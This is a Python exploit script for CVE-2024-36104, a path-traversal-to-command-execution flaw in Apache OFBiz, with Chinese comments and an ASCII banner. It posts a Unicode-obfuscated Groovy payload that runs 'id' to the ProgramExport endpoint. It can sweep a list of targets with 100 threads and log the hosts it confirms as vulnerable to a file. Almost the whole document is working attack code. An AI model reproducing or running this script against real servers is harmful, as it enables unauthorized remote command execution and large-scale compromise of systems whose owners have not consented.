# Apache OFBiz命令执行
# /webtools/control/forgotPassword/%2e/%2e/ProgramExport它可以输入命令 进而导致命令执行
import requests,re,argparse,sys,time,os
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()# 解除警告
def banner():
    banner ="""

 ▄▄▄     ▄▄▄█████▓▄▄▄█████▓ ▄▄▄       ▄████▄   ██ ▄█▀    ███▄    █  ▒█████   █     █░ ▐██▌ 
▒████▄   ▓  ██▒ ▓▒▓  ██▒ ▓▒▒████▄    ▒██▀ ▀█   ██▄█▒     ██ ▀█   █ ▒██▒  ██▒▓█░ █ ░█░ ▐██▌ 
▒██  ▀█▄ ▒ ▓██░ ▒░▒ ▓██░ ▒░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░    ▓██  ▀█ ██▒▒██░  ██▒▒█░ █ ░█  ▐██▌ 
░██▄▄▄▄██░ ▓██▓ ░ ░ ▓██▓ ░ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄    ▓██▒  ▐▌██▒▒██   ██░░█░ █ ░█  ▓██▒ 
 ▓█   ▓██▒ ▒██▒ ░   ▒██▒ ░  ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄   ▒██░   ▓██░░ ████▓▒░░░██▒██▓  ▒▄▄  
 ▒▒   ▓▒█░ ▒ ░░     ▒ ░░    ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒   ░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▓░▒ ▒   ░▀▀▒ 
  ▒   ▒▒ ░   ░        ░      ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░   ░ ░░   ░ ▒░  ░ ▒ ▒░   ▒ ░ ░   ░  ░ 
  ░   ▒    ░        ░        ░   ▒   ░        ░ ░░ ░       ░   ░ ░ ░ ░ ░ ▒    ░   ░      ░ 
      ░  ░                       ░  ░░ ░      ░  ░               ░     ░ ░      ░     ░    
                                    author:           sawa
                                    version:          1.0.0
                                    For:              Apache OFBiz命令执行
                                    Vulnerability ID: CVE-2024-36104        ░                                                     
"""
    print(banner)
def main():
    banner()
    parser = argparse.ArgumentParser(description="Apache OFBiz命令执行poc&exp")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','-file',dest='file',type=str,help='file path')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")# print("Usage:\n\t python3 {} -h".format(sys.argv[0]))
headers = {
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0',
    'Content-Type':'application/x-www-form-urlencoded'
}

def poc(target):
    data = 'groovyProgram=\u0074\u0068\u0072\u006f\u0077\u0020\u006e\u0065\u0077\u0020\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e\u0028\u0027\u0069\u0064\u0027\u002e\u0065\u0078\u0065\u0063\u0075\u0074\u0065\u0028\u0029\u002e\u0074\u0065\u0078\u0074\u0029\u003b'
    payload_url = '/webtools/control/forgotPassword/%2e/%2e/ProgramExport'
    url = target+payload_url
    try:
        res = requests.get(url=target,headers=headers,timeout=10)
        if res.status_code == 200:
            res2 = requests.post(url=url,headers=headers,data=data,timeout=10,verify=False)
            match = re.search(r"uid=0\(root\) gid=0\(root\) groups=0\(root\)",res2.text)
            # print(match.group(1))
            if match is not None:
                if 'uid' in match.group(0):
                    print(f"[+]该{target}存在漏洞")
                    with open('result.txt','a',encoding='utf-8') as fp:
                        fp.write(target+"\n")
                        return True
                else:
                    print(f"[-]该{target}不存在漏洞")
                    return False
    except Exception as e:
        print(f"[!]该url存在问题{target}",e)
        return False




if __name__ == '__main__':
    main()